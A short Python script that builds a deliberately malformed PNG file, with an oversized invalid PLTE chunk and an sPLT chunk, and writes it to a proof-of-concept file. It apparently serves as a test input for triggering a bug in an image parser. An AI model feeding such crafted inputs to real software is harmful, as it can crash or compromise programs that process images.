import struct,zlib
sig=b'\x89PNG\r\n\x1a\n'
def ch(t,d): return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
ihdr=ch(b'IHDR', struct.pack('>IIBBBBB',1,1,8,6,0,0,0))
# use cached PLTE plus large ancillary sPLT-like data? multiple chunks before IDAT, with cache limit set by input not possible.
# make a huge PLTE? invalid for color_type 6, but parser may still read and discard.
plte=ch(b'PLTE', b'A'*768)
# then large sPLT chunk with valid structure
splt_body=b'X\x00\x08'+(b'\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05')*30
splt=ch(b'sPLT', splt_body)
raw=b'\x00\x00\x00\x00\x00'
idat=ch(b'IDAT', zlib.compress(raw))
iend=ch(b'IEND', b'')
payload=b'\x00\x86'+sig+ihdr+plte+splt+idat+iend
open('/workspace/poc.bin','wb').write(payload)
print(len(payload))
